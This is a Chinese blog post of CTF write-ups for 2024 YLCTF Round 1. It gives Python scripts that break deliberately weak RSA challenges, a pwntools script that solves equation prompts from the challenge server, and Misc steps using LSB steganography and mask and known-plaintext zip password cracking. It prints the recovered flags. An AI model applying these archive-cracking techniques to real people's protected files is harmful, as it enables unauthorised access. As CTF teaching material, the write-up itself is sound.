

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/icon.png">
  <link rel="icon" href="../../../../img/icon.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="tenstrings">
  <meta name="keywords" content="">
  
    <meta name="description" content="Round 1Crypto[Round 1] BREAK随机了一个(55555,66666)的e，爆破一下就出了 12345678910111213141516171819from Crypto.Util.number import *from gmpy2 import *c &#x3D; 29244740392452075711987841414956899379927539691324805032429">
<meta property="og:type" content="article">
<meta property="og:title" content="2024 YLCTF">
<meta property="og:url" content="http://example.com/2024/11/01/2024-YLCTF/index.html">
<meta property="og:site_name" content="tenstrings&#39;s blog">
<meta property="og:description" content="Round 1Crypto[Round 1] BREAK随机了一个(55555,66666)的e，爆破一下就出了 12345678910111213141516171819from Crypto.Util.number import *from gmpy2 import *c &#x3D; 29244740392452075711987841414956899379927539691324805032429">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010130322341.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010130243649.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010130549709.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010131438267.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010131456743.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010130916284.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241011203712841.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241011213855014.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241011203751254.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012204302823.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012204318368.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012204334392.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012002620489.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012002638396.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241011231338340.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241011231411184.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012011422640.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012035751372.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241012040139537.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241020165142988.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241020161948798.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241018174609809.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241018193709589.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241019161031685.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241019161433785.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241018174518600.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241018221201707.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241023161635764.png">
<meta property="og:image" content="http://example.com/img/archives/2024-YLCTF/image-20241023161648260.png">
<meta property="article:published_time" content="2024-11-01T03:21:55.000Z">
<meta property="article:modified_time" content="2024-11-16T07:37:21.047Z">
<meta property="article:author" content="tenstrings">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Crypto">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/archives/2024-YLCTF/image-20241010130322341.png">
  
  
  
  <title>2024 YLCTF - tenstrings&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="../../../../css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"AkNKOtPwj7k90lMACLoaJ5ZK-gzGzoHsz","app_key":"e9kFad97QptN4ZXCtoS47NYc","server_url":"https://aknkotpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2020-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="../../../../js/utils.js" ></script>
  <script  src="../../../../js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="../../../../index.html">
      <strong>tenstrings&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../index.html" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('../../../../img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2024 YLCTF"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        tenstrings
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-11-01 11:21" pubdate>
          2024年11月1日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2.7k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          15 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2024 YLCTF</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="Round-1"><a href="#Round-1" class="headerlink" title="Round 1"></a>Round 1</h3><h4 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h4><h5 id="Round-1-BREAK"><a href="#Round-1-BREAK" class="headerlink" title="[Round 1] BREAK"></a>[Round 1] BREAK</h5><p>随机了一个(55555,66666)的e，爆破一下就出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-number">2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456</span><br>p = <span class="hljs-number">112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541</span><br>q = <span class="hljs-number">177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613</span><br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55555</span>,<span class="hljs-number">66666</span>):<br>    <span class="hljs-keyword">if</span> GCD(e, phi) != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    d = invert(e, phi)<br>    m = long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n))<br>    <span class="hljs-keyword">try</span>:<br>        flag=m.decode()<br>        <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&quot;YLCTF&quot;</span>):<br>            <span class="hljs-built_in">print</span>(m.decode())<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>

<p>YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be}</p>
<h5 id="Round-1-ezrsa"><a href="#Round-1-ezrsa" class="headerlink" title="[Round 1] ezrsa"></a>[Round 1] ezrsa</h5><p>解p q，然后直接pqec</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-attribute">hint</span>=104636942321216253499949196992650472436478390748311279997623168444858856212565005575470777025761133042669819087704276518792916869976910488638447567239130212411230613882721172767760926001948961427578800015022259031969968165104053974655999826752934643354758068059342697992941002284015306229237883529295068534566<br><span class="hljs-attribute">n</span>=113323597991624085061754988720439733629524452351931678771262752971035806969352132347016596705526432331903062544002592718117059786374051405428649396204710173913937575477670669321722166487652633727914336210161512781725047690929712364271174654635583233107540578279184329790997368051997427982806978603449019597017<br><span class="hljs-attribute">c</span>=107037286198526394985865182892078748932585076646994108020169994674725585397106369955977692402870725711803853270592931219086132270954286345566389580075401065352179549462941235338798967012704257894673451346168055976240149419808637015749212370865797366048562011252603524950648669269654406391113686485024119636451<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">h</span>=20240918<br><span class="hljs-attribute">yl</span>=bytes_to_long(b&quot;YLCTF&quot;)<br><br><span class="hljs-attribute">p</span>=gcd(pow(20240918,e,n)-hint,n)<br><span class="hljs-attribute">q</span>=n//p<br>phi=(p-1)*(q-1)<br><span class="hljs-attribute">d</span>=inverse(e,phi)<br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>

<h5 id="Round-1-r-A-3"><a href="#Round-1-r-A-3" class="headerlink" title="[Round 1] r(A)&#x3D;3"></a>[Round 1] r(A)&#x3D;3</h5><p>300次三元一次方程组出flag</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vim">import numpy <span class="hljs-keyword">as</span> np<br>from pwn import *<br><br><span class="hljs-keyword">p</span>=remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">33813</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    question=<span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;input x=&quot;</span>)<br>    question=question.decode()<br>    <span class="hljs-keyword">if</span> question.startswith(<span class="hljs-string">&quot;func&quot;</span>) <span class="hljs-keyword">is</span> False:<br>        question=question[<span class="hljs-number">1</span>:]<br>    question=question.replace(<span class="hljs-string">&quot;*x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;*y&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;*z&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    question=question.<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">print</span>(question)<br>    tem1=question[<span class="hljs-number">1</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>    tem2=question[<span class="hljs-number">2</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>    tem3 = question[<span class="hljs-number">3</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>    # <span class="hljs-keyword">print</span>(tem1[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;+&quot;</span>),tem2[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;+&quot;</span>),tem3[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;+&quot;</span>))<br>    A=[np.array([<span class="hljs-keyword">int</span>(coef.<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;*&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> coef in equation[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;+&#x27;</span>)]) <span class="hljs-keyword">for</span> equation in [tem1, tem2, tem3]]<br>    B=np.array([<span class="hljs-keyword">int</span>(tem1[<span class="hljs-number">1</span>]),<span class="hljs-keyword">int</span>(tem2[<span class="hljs-number">1</span>]),<span class="hljs-keyword">int</span>(tem3[<span class="hljs-number">1</span>])])<br>    solution = np.linalg.solve(A, B)<br>    # <span class="hljs-keyword">print</span>(A,B)<br>    # <span class="hljs-keyword">print</span>(solution,solution[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">p</span>.send(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;&quot;</span>+str(<span class="hljs-keyword">int</span>(solution[<span class="hljs-number">0</span>])).encode()+<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;input y=&quot;</span>)<br>    <span class="hljs-keyword">p</span>.send(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;&quot;</span> + str(<span class="hljs-keyword">int</span>(solution[<span class="hljs-number">1</span>])).encode() + <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;input z=&quot;</span>)<br>    <span class="hljs-keyword">p</span>.send(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;&quot;</span> + str(<span class="hljs-keyword">int</span>(solution[<span class="hljs-number">2</span>])).encode() + <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)<br>output = <span class="hljs-keyword">p</span>.recvall(timeout=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span>(output)<br></code></pre></td></tr></table></figure>

<h5 id="Round-1-signrsa"><a href="#Round-1-signrsa" class="headerlink" title="[Round 1] signrsa"></a>[Round 1] signrsa</h5><p>joker了，写了半天n1 n2写反了</p>
<p>n1 n2不互质</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import gmpy2<br>from Crypto.Util.number import *<br><br><span class="hljs-comment"># 已知的密文和模数</span><br>c = 11516173591592387906528797379284719795659927455162331287042410048172205165682815496982552736149847293575228447650607173879891237665489165461873584174287049895850806805566416766585174732676570562193236916785212914791455690292098582511732972439329406423849445368901444923413796301821732962348908247264986674076253972004983394740647381170967650483500171133548129598809265793962610544123055917829945304385904168530690154121382284046800766368554453741911901865827653525076994196646226659413518765482367754861846294144696364783637484503733916678013113384781260011541947539387908774730911805898716383177397837414195581787711<br>n1 = 18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727<br>n2 = 20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951<br>p = gmpy2.gcd(n1, n2)<br>assert (p != 1)<br>print(f<span class="hljs-string">&quot;p = &#123;p&#125;&quot;</span>)<br>q1 = n1 // p<br>q2 = n2 // p<br>e = 65537<br>d1 = inverse(e, (p - 1) * (q1 - 1))<br>d2 = inverse(e, (p - 1) * (q2 - 1))<br>c = pow(c, d2, n2)<br>m = pow(c, d1, n1)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure>

<p>YLCTF{23d36cbe-52d7-46b4-addb-56bde327a37f}</p>
<h5 id="Round-1-threecry"><a href="#Round-1-threecry" class="headerlink" title="[Round 1] threecry"></a>[Round 1] threecry</h5><p>首先是确定素数p和q。已知a是512位的素数。利用相邻素数定律，得出得出n≈13×25×a2。通过对n开平方近似获取a，然后循环寻找下一个素数，直到n被整除，最终计算出p q，由于e&#x3D;57742是偶数，过程中需要考虑e phi的互素关系。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs scss">from Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import long_to_bytes<br>import gmpy2<br><br>def <span class="hljs-built_in">calculate_a_near</span>(number2):<br>    a_near = gmpy2.<span class="hljs-built_in">iroot</span>(number2 // <span class="hljs-number">325</span>, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    while number2 % gmpy2.<span class="hljs-built_in">next_prime</span>(<span class="hljs-number">13</span> * a_near) != <span class="hljs-number">0</span>:<br>        a_near = gmpy2.<span class="hljs-built_in">next_prime</span>(a_near)<br>    return a_near<br><br>def <span class="hljs-built_in">calculate_p_q</span>(number2, a_near):<br>    p = gmpy2.<span class="hljs-built_in">next_prime</span>(<span class="hljs-number">13</span> * a_near)<br>    q = number2 // p<br>    return p, q<br><br>def <span class="hljs-built_in">decrypt_c2</span>(c2, e, number2):<br>    a_near = <span class="hljs-built_in">calculate_a_near</span>(number2)<br>    p, q = <span class="hljs-built_in">calculate_p_q</span>(number2, a_near)<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)  # 直接计算 phi<br>    t = gmpy2.<span class="hljs-built_in">gcd</span>(e, phi)<br>    d = gmpy2.<span class="hljs-built_in">invert</span>(e // t, phi)<br>    m2 = gmpy2.<span class="hljs-built_in">iroot</span>(<span class="hljs-built_in">pow</span>(c2, d, number2), t)[<span class="hljs-number">0</span>]<br>    return <span class="hljs-built_in">long_to_bytes</span>(m2)<br><br>def <span class="hljs-built_in">decrypt_c1</span>(c1, number1, number2, phi):<br>    d1 = gmpy2.<span class="hljs-built_in">invert</span>(number1, phi)<br>    m1 = <span class="hljs-built_in">pow</span>(c1, d1, number2)<br>    return <span class="hljs-built_in">long_to_bytes</span>(m1)<br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    number1 = <span class="hljs-number">6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span><br>    number2 = <span class="hljs-number">20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span><br>    c1 = <span class="hljs-number">12405608660999618097265957137437366071663331952214754002907325304531075800258689590061456707831342835487524037479295573967671590772372879729320816515170640997390767343571441259299771369979031179671545706559882752613500283385673730661771556761298039859614400629468643522376263695765234012418732741549726229907684</span><br>    c2 = <span class="hljs-number">17867493009629454195723402795923807278976405761266687248923423443324682687084222151828263506140089233231214258259873864593871903110076859979044544920410209161618245640658572478006954994831673052121417154093147829059704015532088485831531000877870512720482263657406229891194171974695942960168522826499853303675454</span><br>    e = <span class="hljs-number">57742</span><br><br>    a_near = <span class="hljs-built_in">calculate_a_near</span>(number2)<br>    p, q = <span class="hljs-built_in">calculate_p_q</span>(number2, a_near)<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)  # 直接计算 phi<br><br>    flag2 = <span class="hljs-built_in">decrypt_c2</span>(c2, e, number2)<br>    flag1 = <span class="hljs-built_in">decrypt_c1</span>(c1, number1, number2, phi)<br>    <span class="hljs-built_in">print</span>(flag1 + flag2)<br></code></pre></td></tr></table></figure>



<h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="签到-打卡小能手"><a href="#签到-打卡小能手" class="headerlink" title="[签到] 打卡小能手"></a>[签到] 打卡小能手</h5><p>没什么说的</p>
<p>YLCTF{W3lc0m3_T0_Yuan1ooCtf}</p>
<h5 id="Round-1-hide-png"><a href="#Round-1-hide-png" class="headerlink" title="[Round 1] hide_png"></a>[Round 1] hide_png</h5><p>眼睛看瞎了</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241010130322341.png" srcset="/img/loading.gif" lazyload alt="image-20241010130322341"></p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241010130243649.png" srcset="/img/loading.gif" lazyload alt="image-20241010130243649"></p>
<p>YLCTF{a27f2d1a-9176-42cf-a2b6-1c87b17b98dc}</p>
<h5 id="Round-1-pngorzip"><a href="#Round-1-pngorzip" class="headerlink" title="[Round 1] pngorzip"></a>[Round 1] pngorzip</h5><p>stegsolve lsb分离出zip，删除后面的无用内容，提示114514????</p>
<p>直接ARCHPR掩码爆破出114514giao</p>
<p><img src="../../../../img/archives/2024-YLCTF/image-20241010130549709.png" srcset="/img/loading.gif" lazyload alt="image-20241010130549709"></p>
<p>YLCTF{d359d6e4-740a-49cf-83eb-5b0308f09c8c}</p>
<h5 id="Round-1-plain-crack"><a href="#Round-1-plain-crack" class="headerlink" title="[Round 1] plain_crack"></a>[Round 1] plain_crack</h5><p>一眼丁真 明文攻击</p>
<p>压缩build.py，直接ARCHPR解一下，然后解出docx，改后缀为.zip在里面找到flag图片</p>
